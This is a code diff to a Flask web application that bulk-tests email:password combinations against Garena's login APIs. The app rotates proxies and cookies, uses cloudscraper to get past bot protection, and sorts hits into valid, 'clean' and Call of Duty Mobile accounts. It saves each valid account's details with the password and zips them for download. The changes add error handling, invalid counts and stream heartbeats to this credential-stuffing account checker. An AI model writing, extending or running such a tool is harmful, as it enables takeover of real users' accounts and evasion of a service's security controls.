@@ -8,6 +8,7 @@ import json
 import uuid
 import base64
 import re
+import traceback
 from flask import Flask, render_template, request, jsonify, send_file, Response
 from werkzeug.utils import secure_filename
 import cloudscraper
@@ -291,10 +292,12 @@ def parse_account_details(data):
 # -------------------- Main Check Function --------------------
 def check_account_full(account_line, proxy=None, cookie=None, result_folder='results', check_games=True):
     if ':' not in account_line:
-        return None
-    email, password = account_line.split(':', 1)
-    email = email.strip()
-    password = password.strip()
+        return {'valid': False, 'error': 'Invalid format (missing colon)'}
+    parts = account_line.split(':', 1)
+    email = parts[0].strip()
+    password = parts[1].strip()
+    if not email or not password:
+        return {'valid': False, 'error': 'Empty email or password'}
 
     session = cloudscraper.create_scraper()
     if proxy:
@@ -314,15 +317,17 @@ def check_account_full(account_line, proxy=None, cookie=None, result_folder='res
     try:
         resp = session.get(url, params=params, timeout=30)
         if resp.status_code != 200:
-            return {'email': email, 'valid': False, 'error': f'Prelogin {resp.status_code}'}
+            return {'email': email, 'valid': False, 'error': f'Prelogin HTTP {resp.status_code}'}
         data = resp.json()
         if 'error' in data:
-            return {'email': email, 'valid': False, 'error': data['error']}
+            return {'email': email, 'valid': False, 'error': f"Prelogin: {data['error']}"}
         v1, v2 = data.get('v1'), data.get('v2')
         if not v1 or not v2:
             return {'email': email, 'valid': False, 'error': 'Missing v1/v2'}
+    except requests.exceptions.Timeout:
+        return {'email': email, 'valid': False, 'error': 'Prelogin timeout'}
     except Exception as e:
-        return {'email': email, 'valid': False, 'error': str(e)}
+        return {'email': email, 'valid': False, 'error': f'Prelogin error: {str(e)[:50]}'}
 
     # Login
     hashed = hash_password(password, v1, v2)
@@ -331,19 +336,23 @@ def check_account_full(account_line, proxy=None, cookie=None, result_folder='res
     try:
         resp = session.get('https://sso.garena.com/api/login', params=params, timeout=30)
         if resp.status_code != 200:
-            return {'email': email, 'valid': False, 'error': f'Login {resp.status_code}'}
+            return {'email': email, 'valid': False, 'error': f'Login HTTP {resp.status_code}'}
         data = resp.json()
         if 'error' in data:
-            return {'email': email, 'valid': False, 'error': data['error']}
+            return {'email': email, 'valid': False, 'error': f"Login: {data['error']}"}
+    except requests.exceptions.Timeout:
+        return {'email': email, 'valid': False, 'error': 'Login timeout'}
     except Exception as e:
-        return {'email': email, 'valid': False, 'error': str(e)}
+        return {'email': email, 'valid': False, 'error': f'Login error: {str(e)[:50]}'}
 
     # Get account info
     try:
         resp = session.get('https://account.garena.com/api/account/init', timeout=30)
+        if resp.status_code != 200:
+            return {'email': email, 'valid': False, 'error': f'Account info HTTP {resp.status_code}'}
         acc_data = resp.json()
-    except:
-        return {'email': email, 'valid': False, 'error': 'Account info failed'}
+    except Exception as e:
+        return {'email': email, 'valid': False, 'error': f'Account info: {str(e)[:50]}'}
 
     details = parse_account_details(acc_data)
     details['password'] = password
@@ -502,80 +511,114 @@ def start_check():
         'total': len(accounts),
         'checked': 0,
         'valid': 0,
+        'invalid': 0,
         'clean': 0,
         'codm': 0,
         'status': 'running',
-        'result_folder': result_folder
+        'result_folder': result_folder,
+        'last_error': None
     }
 
     def worker():
         checked = 0
         valid = 0
+        invalid = 0
         clean = 0
         codm_count = 0
         cookie_idx = 0
+        last_error = None
 
-        for i, acc in enumerate(accounts):
-            proxy = random.choice(proxies) if (use_proxy and proxies) else None
-            cookie = cookies[cookie_idx % len(cookies)] if cookies else None
-            if cookies:
-                cookie_idx += 1
+        try:
+            for i, acc in enumerate(accounts):
+                proxy = random.choice(proxies) if (use_proxy and proxies) else None
+                cookie = cookies[cookie_idx % len(cookies)] if cookies else None
+                if cookies:
+                    cookie_idx += 1
 
-            result = check_account_full(acc, proxy, cookie, result_folder, check_games)
-            checked += 1
-            if result and result.get('valid'):
-                valid += 1
-                if result.get('clean'):
-                    clean += 1
-                if result.get('has_codm'):
-                    codm_count += 1
+                try:
+                    result = check_account_full(acc, proxy, cookie, result_folder, check_games)
+                except Exception as e:
+                    result = {'valid': False, 'error': f'Exception: {str(e)[:100]}', 'email': acc.split(':')[0] if ':' in acc else acc}
+                    last_error = result['error']
 
-            tasks[task_id]['checked'] = checked
-            tasks[task_id]['valid'] = valid
-            tasks[task_id]['clean'] = clean
-            tasks[task_id]['codm'] = codm_count
-            progress_queue.put({
-                'checked': checked,
-                'total': len(accounts),
-                'valid': valid,
-                'clean': clean,
-                'codm': codm_count,
-                'current': acc.split(':')[0],
-                'level': result.get('codm_level') if result else None
-            })
-            time.sleep(0.1)
+                checked += 1
+                if result and result.get('valid'):
+                    valid += 1
+                    if result.get('clean'):
+                        clean += 1
+                    if result.get('has_codm'):
+                        codm_count += 1
+                else:
+                    invalid += 1
+                    last_error = result.get('error', 'Unknown error') if result else 'No result'
 
-        # Create ZIP
-        zip_path = os.path.join(app.config['RESULTS_FOLDER'], f'{task_id}.zip')
-        with zipfile.ZipFile(zip_path, 'w') as zipf:
-            for root, _, files in os.walk(result_folder):
-                for file in files:
-                    full = os.path.join(root, file)
-                    arc = os.path.relpath(full, result_folder)
-                    zipf.write(full, arc)
+                tasks[task_id]['checked'] = checked
+                tasks[task_id]['valid'] = valid
+                tasks[task_id]['invalid'] = invalid
+                tasks[task_id]['clean'] = clean
+                tasks[task_id]['codm'] = codm_count
+                tasks[task_id]['last_error'] = last_error
 
-        tasks[task_id]['status'] = 'completed'
-        tasks[task_id]['zip'] = f'/download/{task_id}'
-        progress_queue.put({'done': True, 'zip': f'/download/{task_id}'})
+                # Send progress update
+                progress_queue.put({
+                    'checked': checked,
+                    'total': len(accounts),
+                    'valid': valid,
+                    'invalid': invalid,
+                    'clean': clean,
+                    'codm': codm_count,
+                    'current': acc.split(':')[0] if ':' in acc else acc,
+                    'level': result.get('codm_level') if result and result.get('valid') else None,
+                    'error': result.get('error') if result and not result.get('valid') else None
+                })
+                time.sleep(0.1)
 
-    threading.Thread(target=worker).start()
+            # Create ZIP
+            zip_path = os.path.join(app.config['RESULTS_FOLDER'], f'{task_id}.zip')
+            with zipfile.ZipFile(zip_path, 'w') as zipf:
+                for root, _, files in os.walk(result_folder):
+                    for file in files:
+                        full = os.path.join(root, file)
+                        arc = os.path.relpath(full, result_folder)
+                        zipf.write(full, arc)
+
+            tasks[task_id]['status'] = 'completed'
+            tasks[task_id]['zip'] = f'/download/{task_id}'
+            progress_queue.put({'done': True, 'zip': f'/download/{task_id}'})
+        except Exception as e:
+            error_msg = f'Worker crashed: {str(e)}\n{traceback.format_exc()}'
+            print(error_msg)
+            tasks[task_id]['status'] = 'error'
+            tasks[task_id]['last_error'] = error_msg[:200]
+            progress_queue.put({'done': True, 'error': error_msg[:200]})
+
+    threading.Thread(target=worker, daemon=True).start()
     return jsonify({'task_id': task_id})
 
 @app.route('/progress/<task_id>')
 def progress(task_id):
     def generate():
         if task_id not in tasks:
-            yield 'data: {"error": "Invalid task"}\n\n'
+            yield f'data: {json.dumps({"error": "Invalid task"})}\n\n'
             return
         q = tasks[task_id]['queue']
+        last_heartbeat = time.time()
         while True:
             try:
-                msg = q.get(timeout=30)
+                # Use timeout to send heartbeats
+                msg = q.get(timeout=5)
                 yield f'data: {json.dumps(msg)}\n\n'
+                last_heartbeat = time.time()
                 if msg.get('done'):
                     break
             except queue.Empty:
-                yield 'data: {"heartbeat": true}\n\n'
+                # Send heartbeat to keep connection alive
+                if time.time() - last_heartbeat > 5:
+                    yield f'data: {json.dumps({"heartbeat": True})}\n\n'
+                    last_heartbeat = time.time()
+                # Check if task still exists and is running
+                if task_id not in tasks or tasks[task_id].get('status') in ('completed', 'error'):
+                    break
     return Response(generate(), mimetype='text/event-stream')
 
 @app.route('/download/<task_id>')
